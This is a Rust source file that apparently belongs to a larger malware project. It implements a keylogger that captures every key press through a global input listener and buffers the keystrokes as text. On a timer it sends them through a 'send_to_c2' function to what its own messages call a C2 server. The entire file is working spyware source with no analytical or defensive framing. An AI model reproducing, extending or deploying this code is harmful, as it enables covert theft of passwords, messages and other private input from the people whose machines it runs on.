use crate::connexion::send_to_c2;
use anyhow::{Result, Context};
use rdev::{Event, EventType, Key};
use std::sync::{Arc, Mutex};
use tokio::time::{interval, Duration};

const MAX_BUFFER_SIZE: usize = 10_000;

lazy_static::lazy_static! {
    static ref GLOBAL_BUFFER: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
}

struct KeyLogger {
    buffer: Arc<Mutex<Vec<String>>>,
}

impl KeyLogger {
    fn new() -> Self {
        Self {
            buffer: Arc::clone(&GLOBAL_BUFFER),
        }
    }
    
    async fn start(&self, send_interval: Duration) -> Result<()> {
        let mut listener_handle = tokio::task::spawn_blocking(|| {
            rdev::listen(callback)
        });
        
        let mut send_interval = interval(send_interval);
        
        loop {
            tokio::select! {
                _ = send_interval.tick() => {
                    if let Err(e) = self.send_buffer().await {
                        eprintln!("Erreur lors de l'envoi: {}", e);
                    }
                }
                
                result = &mut listener_handle => {
                    match result {
                        Ok(Ok(())) => println!("Listener arrêté normalement"),
                        Ok(Err(e)) => eprintln!("Erreur du listener: {:?}", e),
                        Err(e) => eprintln!("Erreur de jointure: {:?}", e),
                    }
                    break;
                }
            }
        }
        
        self.send_buffer().await?;
        Ok(())
    }
    
    async fn send_buffer(&self) -> Result<()> {
        let data = {
            let mut buffer = self.buffer.lock()
                .map_err(|e| anyhow::anyhow!("Impossible de verrouiller le buffer: {}", e))?;
            
            if buffer.is_empty() {
                return Ok(());
            }
            
            let data = buffer.join("");
            buffer.clear();
            data
        };
        
        println!("Envoi de {} caractères", data.len());
        
        send_to_c2(data.into_bytes()).await
            .context("Erreur lors de l'envoi au C2")?;
        
        Ok(())
    }
}

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        if let Some(key_char) = key_to_string(key) {
            if let Ok(mut buffer) = GLOBAL_BUFFER.lock() {
                if buffer.len() < MAX_BUFFER_SIZE {
                    buffer.push(key_char);
                } 
            }
        }
    }
}

fn key_to_string(key: Key) -> Option<String> {
    Some(match key {
        Key::Return => "\n".to_string(),
        Key::Space => " ".to_string(),
        Key::Backspace => "[BACK]".to_string(),
        Key::Escape => "[ESC]".to_string(),
        Key::Tab => "[TAB]".to_string(),
        Key::CapsLock => "[CAPS]".to_string(),
        Key::Delete => "[DEL]".to_string(),
        Key::Home => "[HOME]".to_string(),
        Key::End => "[END]".to_string(),
        Key::PageUp => "[PGUP]".to_string(),
        Key::PageDown => "[PGDN]".to_string(),
        
        Key::ControlLeft | Key::ControlRight => "[CTRL]".to_string(),
        Key::ShiftLeft | Key::ShiftRight => "[SHIFT]".to_string(),
        Key::Alt => "[ALT]".to_string(),
        Key::MetaLeft | Key::MetaRight => "[META]".to_string(),
        
        Key::UpArrow => "[UP]".to_string(),
        Key::DownArrow => "[DOWN]".to_string(),
        Key::LeftArrow => "[LEFT]".to_string(),
        Key::RightArrow => "[RIGHT]".to_string(),
        
        Key::Dot => ".".to_string(),
        Key::Comma => ",".to_string(),
        Key::SemiColon => ";".to_string(),
        Key::Quote => "'".to_string(),
        Key::BackSlash => "\\".to_string(),
        Key::Slash | Key::KpDivide => "/".to_string(),
        Key::Minus | Key::KpMinus => "-".to_string(),
        Key::Equal => "=".to_string(),
        Key::LeftBracket => "[".to_string(),
        Key::RightBracket => "]".to_string(),
        
        Key::KpMultiply => "*".to_string(),
        Key::KpPlus => "+".to_string(),
        
        Key::Num0 | Key::Kp0 => "0".to_string(),
        Key::Num1 | Key::Kp1 => "1".to_string(),
        Key::Num2 | Key::Kp2 => "2".to_string(),
        Key::Num3 | Key::Kp3 => "3".to_string(),
        Key::Num4 | Key::Kp4 => "4".to_string(),
        Key::Num5 | Key::Kp5 => "5".to_string(),
        Key::Num6 | Key::Kp6 => "6".to_string(),
        Key::Num7 | Key::Kp7 => "7".to_string(),
        Key::Num8 | Key::Kp8 => "8".to_string(),
        Key::Num9 | Key::Kp9 => "9".to_string(),
        
        Key::KeyA => "a".to_string(),
        Key::KeyB => "b".to_string(),
        Key::KeyC => "c".to_string(),
        Key::KeyD => "d".to_string(),
        Key::KeyE => "e".to_string(),
        Key::KeyF => "f".to_string(),
        Key::KeyG => "g".to_string(),
        Key::KeyH => "h".to_string(),
        Key::KeyI => "i".to_string(),
        Key::KeyJ => "j".to_string(),
        Key::KeyK => "k".to_string(),
        Key::KeyL => "l".to_string(),
        Key::KeyM => "m".to_string(),
        Key::KeyN => "n".to_string(),
        Key::KeyO => "o".to_string(),
        Key::KeyP => "p".to_string(),
        Key::KeyQ => "q".to_string(),
        Key::KeyR => "r".to_string(),
        Key::KeyS => "s".to_string(),
        Key::KeyT => "t".to_string(),
        Key::KeyU => "u".to_string(),
        Key::KeyV => "v".to_string(),
        Key::KeyW => "w".to_string(),
        Key::KeyX => "x".to_string(),
        Key::KeyY => "y".to_string(),
        Key::KeyZ => "z".to_string(),
        
        Key::F1 => "[F1]".to_string(),
        Key::F2 => "[F2]".to_string(),
        Key::F3 => "[F3]".to_string(),
        Key::F4 => "[F4]".to_string(),
        Key::F5 => "[F5]".to_string(),
        Key::F6 => "[F6]".to_string(),
        Key::F7 => "[F7]".to_string(),
        Key::F8 => "[F8]".to_string(),
        Key::F9 => "[F9]".to_string(),
        Key::F10 => "[F10]".to_string(),
        Key::F11 => "[F11]".to_string(),
        Key::F12 => "[F12]".to_string(),
        
        Key::PrintScreen => "[PRINT]".to_string(),
        Key::ScrollLock => "[SCROLL]".to_string(),
        Key::Pause => "[PAUSE]".to_string(),
        Key::Insert => "[INS]".to_string(),
        Key::NumLock => "[NUMLOCK]".to_string(),
        
        _ => format!("[{:?}]", key),
    })
}

pub async fn start_keylogger(interval_sec: u64) -> Result<()> {
    let logger = KeyLogger::new();
    logger.start(Duration::from_secs(interval_sec)).await
}